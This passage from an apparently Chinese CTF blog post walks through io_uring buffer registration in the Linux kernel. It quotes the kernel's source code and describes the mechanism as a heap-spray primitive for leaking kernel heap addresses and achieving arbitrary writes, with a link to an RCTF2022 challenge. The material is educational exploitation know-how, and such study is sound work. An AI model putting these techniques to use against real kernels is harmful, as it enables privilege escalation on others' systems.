i);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (copy_from_user(tag_slot, &amp;utags[i],</span><br><span class="line">					   <span class="keyword">sizeof</span>(*tag_slot)))</span><br><span class="line">				<span class="keyword">goto</span> fail;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">atomic_set</span>(&amp;data-&gt;refs, <span class="number">1</span>);</span><br><span class="line">	init_completion(&amp;data-&gt;done);</span><br><span class="line">	*pdata = data;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fail:</span><br><span class="line">	io_rsrc_data_free(data);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要注意 io_sqe_buffers_registers 函数有额外的分配噪音： io_buffers_map_alloc(ctx, nr_args); 函数</p>
<h3 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h3><p>当我们完成 4k 对象的分配之后，我们还可以通过 <code>IORING_REGISTER_BUFFERS_UPDATE</code> opcode 更新 4k 内核对象中的数据，最后会调用到 <code>__io_sqe_buffers_update()</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_sqe_buffers_update(<span class="keyword">struct</span> io_ring_ctx *ctx,</span><br><span class="line">				   <span class="keyword">struct</span> io_uring_rsrc_update2 *up,</span><br><span class="line">				   <span class="type">unsigned</span> <span class="type">int</span> nr_args)</span><br><span class="line">&#123;</span><br><span class="line">	u64 __user *tags = u64_to_user_ptr(up-&gt;tags);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>, __<span class="title">user</span> *<span class="title">iovs</span> =</span> u64_to_user_ptr(up-&gt;data);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">last_hpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">bool</span> needs_switch = <span class="literal">false</span>;</span><br><span class="line">	__u32 done;</span><br><span class="line">	<span class="type">int</span> i, err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ctx-&gt;buf_data)</span><br><span class="line">		<span class="keyword">return</span> -ENXIO;</span><br><span class="line">	<span class="keyword">if</span> (up-&gt;offset + nr_args &gt; ctx-&gt;nr_user_bufs)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (done = <span class="number">0</span>; done &lt; nr_args; done++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span> *<span class="title">imu</span>;</span></span><br><span class="line">		<span class="type">int</span> offset = up-&gt;offset + done;</span><br><span class="line">		u64 tag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		err = io_copy_iov(ctx, &amp;iov, iovs, done);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (tags &amp;&amp; copy_from_user(&amp;tag, &amp;tags[done], <span class="keyword">sizeof</span>(tag))) &#123;</span><br><span class="line">			err = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		err = io_buffer_validate(&amp;iov);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!iov.iov_base &amp;&amp; tag) &#123;</span><br><span class="line">			err = -EINVAL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		err = io_sqe_buffer_register(ctx, &amp;iov, &amp;imu, &amp;last_hpage);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		i = array_index_nospec(offset, ctx-&gt;nr_user_bufs);</span><br><span class="line">		<span class="keyword">if</span> (ctx-&gt;user_bufs[i] != ctx-&gt;dummy_ubuf) &#123;</span><br><span class="line">			err = io_queue_rsrc_removal(ctx-&gt;buf_data, i,</span><br><span class="line">						    ctx-&gt;rsrc_node, ctx-&gt;user_bufs[i]);</span><br><span class="line">			<span class="keyword">if</span> (unlikely(err)) &#123;</span><br><span class="line">				io_buffer_unmap(ctx, &amp;imu);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ctx-&gt;user_bufs[i] = ctx-&gt;dummy_ubuf;</span><br><span class="line">			needs_switch = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ctx-&gt;user_bufs[i] = imu;</span><br><span class="line">		*io_get_tag_slot(ctx-&gt;buf_data, i) = tag;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (needs_switch)</span><br><span class="line">		io_rsrc_node_switch(ctx, ctx-&gt;buf_data);</span><br><span class="line">	<span class="keyword">return</span> done ? done : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="读取-写入"><a href="#读取-写入" class="headerlink" title="读取&#x2F;写入"></a>读取&#x2F;写入</h3><p><code>IORING_REGISTER_BUFFERS2</code> 本身的含义便是将多个缓冲区提前注册到内核中以辅助 <code>io_uring</code> 的使用，因此我们可以通过 <code>io_uring</code> 本身的功能提交 SQE 将数据从文件中拷贝到缓冲区，或是从缓冲区读取到文件</p>
<p>因此我们可以在用户空间使用管道来将这些 4k 缓冲区的数据读取到用户空间，或是将管道&#x2F;文件中的数据写入这些内核缓冲区</p>
<h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p>既然有对应分配的 register，自然也有对应释放的 unregister，我们可以通过 <code>IORING_UNREGISTER_BUFFERS </code>opcode 释放之前分配的内存，最后会调用到 <code>io_rsrc_data_free()</code> 进行释放：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_free_page_table</span><span class="params">(<span class="type">void</span> **table, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++)</span><br><span class="line">		kfree(table[i]);</span><br><span class="line">	kfree(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_rsrc_data_free</span><span class="params">(<span class="keyword">struct</span> io_rsrc_data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> size = data-&gt;nr * <span class="keyword">sizeof</span>(data-&gt;tags[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (data-&gt;tags)</span><br><span class="line">		io_free_page_table((<span class="type">void</span> **)data-&gt;tags, size);</span><br><span class="line">	kfree(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数据泄漏"><a href="#数据泄漏" class="headerlink" title="数据泄漏"></a>数据泄漏</h3><h4 id="内核“堆”上地址"><a href="#内核“堆”上地址" class="headerlink" title="内核“堆”上地址"></a>内核“堆”上地址</h4><p>由于指针数组中存放的直接就是指向内核对象的指针，而且该对象使用的通用分配 flag GFP_KERNEL_ACCOUNT。</p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>如果可以修改指针数组中的指针，就可以通过 update 功能进行任意地址写。</p>
<blockquote>
<p>若我们能够多次修改指针数组中的指针，则还可以进行堆基址的爆破（因为用的是 <code>copy_from_user()</code> 所以是🆗的）</p>
</blockquote>
<h2 id="例题：RCTF2022-game"><a href="#例题：RCTF2022-game" class="headerlink" title="例题：RCTF2022-game"></a>例题：RCTF2022-game</h2><p><a href="2025-10-13-RCTF2022-game%E5%AD%A6%E4%B9%A0.md">RCTF2022-game</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II">【PWN.0x02】Linux Kernel Pwn II：常用结构体集合</a></li>
<li><a href="https://196082.github.io/2023/04/20/io-uring/#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">io_uring在kernel pwn中的优异表现</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
</search>
